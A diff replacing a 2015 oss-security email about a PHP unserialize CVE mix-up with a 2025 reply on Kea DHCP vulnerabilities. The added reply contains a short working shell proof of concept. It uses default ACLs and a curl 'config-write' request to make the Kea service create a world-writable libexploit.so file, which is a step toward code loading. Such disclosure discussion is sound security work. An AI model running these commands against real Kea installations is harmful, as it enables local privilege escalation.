@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2336" "Monday" "30" "March" "2015" "17:49:54" "-0500" "Tyler Hicks" "tyhicks@canonical.com" "<20150330224953.GC6329@boyd>" "70" "Re: [oss-security] CVE Request: PHP SoapClient's __call() type confusion through unserialize()" nil nil nil "3" "2015033022:49:54" "[oss-security] CVE Request: PHP SoapClient's __call() type confusion through unserialize()" (number mark "        tyhicks@cano Mar 30   70/2336  " thread-indent "\"Re: [oss-security] CVE Request: PHP SoapClient's __call() type confusion through unserialize()\"\n") "<20150330234201.410bcbb8@redhat.com>" ("<550C769F.5010801@truel.it>" "<20150330234201.410bcbb8@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 15526 invoked by uid 550); 30 Mar 2015 22:50:09 -0000
+Received: (qmail 13544 invoked by uid 550); 28 May 2025 18:23:39 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,91 +6,58 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 15507 invoked from network); 30 Mar 2015 22:50:09 -0000
-Message-ID: <20150330224953.GC6329@boyd>
-References: <550C769F.5010801@truel.it>
- <20150330234201.410bcbb8@redhat.com>
-MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha512;
-	protocol="application/pgp-signature"; boundary="hOcCNbCCxyk/YU74"
-Content-Disposition: inline
-In-Reply-To: <20150330234201.410bcbb8@redhat.com>
-User-Agent: Mutt/1.5.23 (2014-03-12)
-Cc: security@php.net
-Date: Mon, 30 Mar 2015 17:49:54 -0500
-From: Tyler Hicks <tyhicks@canonical.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] CVE Request: PHP SoapClient's __call() type
- confusion through unserialize()
+x-ms-reactions: disallow
+Received: (qmail 13517 invoked from network); 28 May 2025 18:23:39 -0000
+Authentication-Results:garm.ovh; auth=pass (GARM-109S0032f7444f4-db54-4448-bb23-04aff08398be,
+                    99B821EB379423EA779491C0A280EB282E82DE62) smtp.auth=jwilk@jwilk.net
+X-OVh-ClientIp:31.0.176.17
+Date: Wed, 28 May 2025 20:23:25 +0200
+From: Jakub Wilk <jwilk@jwilk.net>
 To: oss-security@lists.openwall.com
-
---hOcCNbCCxyk/YU74
-Content-Type: text/plain; charset=us-ascii
+Message-ID: <20250528182325.yuupynsufybqvea3@jwilk.net>
+Mail-Followup-To: oss-security@lists.openwall.com
+References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
+ <aDdGEfMxLaRJzSK9@kasco.suse.de>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii; format=flowed
 Content-Disposition: inline
-Content-Transfer-Encoding: quoted-printable
+In-Reply-To: <aDdGEfMxLaRJzSK9@kasco.suse.de>
+X-Ovh-Tracer-Id: 6098155372169276625
+X-VR-SPAMSTATE: OK
+X-VR-SPAMSCORE: 0
+X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeeffedrtddtgddvfeeljeculddtuddrgeefvddrtddtmdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemucehtddtnecunecujfgurhepfffhvffukfhfgggtuggjsehttdertddttddvnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpeelfeevfeduheeihfeuledvveeiteevgfekieefveekleffgfeiieefkeevieejkeenucfkphepuddvjedrtddrtddruddpfedurddtrddujeeirddujeenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepihhnvghtpeduvdejrddtrddtrddupdhmrghilhhfrhhomhepjhifihhlkhesjhifihhlkhdrnhgvthdpnhgspghrtghpthhtohepuddprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhmpdfovfetjfhoshhtpehmohehfeegmgdpmhhouggvpehsmhhtphhouhht
+DKIM-Signature: a=rsa-sha256; bh=8oXtjaw6WvJE7kZs0iUJug55H/jVFGC4CKVzjvnOvQY=;
+ c=relaxed/relaxed; d=jwilk.net; h=From; s=ovhmo917968-selector1;
+ t=1748456610; v=1;
+ b=e4548VLw4tiE92YOwhXxCdJ2biQrTD2IOemmT3OlQ3oTBFO9Qwa0R+1nQ5vquzQuz3hYQ3ix
+ YofpEWAGR4f+Xs9za70GeLUhs9SLonuadvIS+uXP23iUXlcbuJQoLQLmT5tO7nUGRYdgk7pIwCj
+ FnlWB+KPkFSmY27j8Xr73DdnMLtjsmkIiLx2iew0hNHfilfut/Br6uCT/u2uXLVfuVtBpfFNoZH
+ 7ZnJMKyTSYdNyLDePmrdAs0nXlSVrz9hXvA7wAD9NWEFDr+vSq5DjGwJHtGIDMjHQHf+8C6E/GY
+ XnTxUmjCistkIe7kg/+pPdrSepnGpNTs1Kad8d4wvsoPw==
+Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
+ (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)
 
-On 2015-03-30 23:42:01, Tomas Hoger wrote:
-> On Fri, 20 Mar 2015 20:35:59 +0100 Andrea Palazzo wrote:
->=20
-> > I'd like to request a CVE for the PHP Sec Bug #69085.
-> >=20
-> > Description:
-> > SoapClient's __call() method is prone to a type confusion
-> > vulnerability which can be used to gain remote code execution through
-> > unsafe unserialize() calls.
-> >=20
-> > Info:
-> > https://bugs.php.net/bug.php?id=3D69085
->=20
-> There is another unserialize issue fixed in 5.6.7, 5.5.23 and 5.4.39
-> and currently listed on PHP 5 Changelog page:
->=20
-> http://php.net/ChangeLog-5.php
->=20
-> Fixed bug #68976 (Use After Free Vulnerability in unserialize()). (CVE-20=
-15-0231)
-> https://bugs.php.net/68976
+* Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
+>By leveraging issue 3.2), the Kea services can be instructed to create 
+>`_kea` owned files in the attacker's `$HOME/.Private`. The content of 
+>the created files is not fully attacker controlled, however, so it will 
+>not be possible to craft a valid ELF object for loading via `dlopen()` 
+>this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`, 
+>any files created in this directory will even have the group-ownership 
+>of the attacker. The file mode will be 0644, however,
 
-I believe that the ChangeLog-5.php page contains a typo since NVD claims
-that CVE-2015-2787 corresponds to PHP bug #68976:
+Default ACLs to the rescue!
 
- https://web.nvd.nist.gov/view/vuln/detail?vulnId=3DCVE-2015-2787
+$ chmod a+x ~
+$ mkdir -m 777 ~/.Private
+$ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
+$ curl -s -H "Content-Type: application/json" -d '{ "command": "config-write", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' localhost:8000 > /dev/null
+$ echo pwned > ~/.Private/libexploit.so
+$ ls -l ~/.Private/libexploit.so
+-rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
+$ cat ~/.Private/libexploit.so
+pwned
 
-Tyler
-
->=20
-> While this lists CVE, it's CVE that was assigned to an issue fixed in
-> 5.6.5, 5.5.21 and 5.4.37:
->=20
-> Fixed bug #68710 (Use After Free Vulnerability in PHP's unserialize()). (=
-CVE-2015-0231)
-> https://bugs.php.net/68710
->=20
-> New id seems to be required for the new issue.
->=20
-> --=20
-> Tomas Hoger / Red Hat Product Security
-
---hOcCNbCCxyk/YU74
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: Digital signature
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCgAGBQJVGdMRAAoJENaSAD2qAscKkc4QAM71gYpow1xwJk89ArsaBdBd
-jVYFhDAFs9TsFgKHetfwogcQmG0oRMMve52JaJyLQwKtQiUFCp3WpR+4DkkImnG8
-xgNK8S82ah9+p8p0lCn0jKLnuvlTxYoAiyFzcyQLkD2Y7J5hNJB2fO1AMt9Zw7AQ
-D4HEIZx+kKJYWkXYO1GIWN/iUAV4PK0TjsaXD0Hp0emlIBjoaLr7hDSofdas411W
-wJSsrL0xrL0JksY/Fdqy5TMH83FeTzcm7sMkkzdSr67+QMon1Keo1Z1qZKKZWl78
-DlfLNuzKQRHry97Exxx9A54znFPaEcRcs05pURjYAkrrdPJvbSGZ9mQl/zZh6ypU
-baz9b56Z+fLLGbPte31BEpgAVQ7h61X5GgmPAKXc2USIJbh11j1N1FcUBCBktcg1
-w1XFIGn2ac6c3O6Z7v++hQJFFZtFy2b5LTwTajQ8IqPSOAhlD8OG0kqr3jfiQz+m
-QdBUKgbsZKCtRh6I63cUP/L4QZoBYIi9NMiRd8TDv9tSScn1LhUJo2PFS1OOYQwW
-Y8XkoVsSqjvZmGBLgvzuemfG6Awat8z9/4bJl88rt6ydnVUWAczvl0ab11uQ+pVT
-O7Dkt3XYl5Qg+f1/9ZKxx9/zIL1mq9gMHRz2XFMB4ZwrQARFu8xkxKuav17IR6UA
-R7wqq+AjfeYaDEF83ckp
-=grPj
------END PGP SIGNATURE-----
-
---hOcCNbCCxyk/YU74--
+-- 
+Jakub Wilk
